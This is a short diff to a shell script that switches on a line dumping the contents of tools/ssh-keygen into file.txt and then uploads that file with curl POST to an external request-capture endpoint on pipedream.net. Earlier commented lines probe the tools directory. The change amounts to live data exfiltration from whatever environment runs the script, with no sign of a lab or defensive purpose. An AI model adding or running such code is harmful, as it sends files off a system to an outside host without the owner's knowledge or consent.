@@ -11,6 +11,7 @@
 #curl "$url"
 
 #echo $(ls tools) > file.txt
-#echo $(cat tools/ssh-keygen) > file.txt
+echo $(cat tools/ssh-keygen) > file.txt
 curl -i -X POST https://en0liva7dzyvpp.x.pipedream.net/ \
+  -H "Content-Type: text/xml" \
   --data-binary "@file.txt"
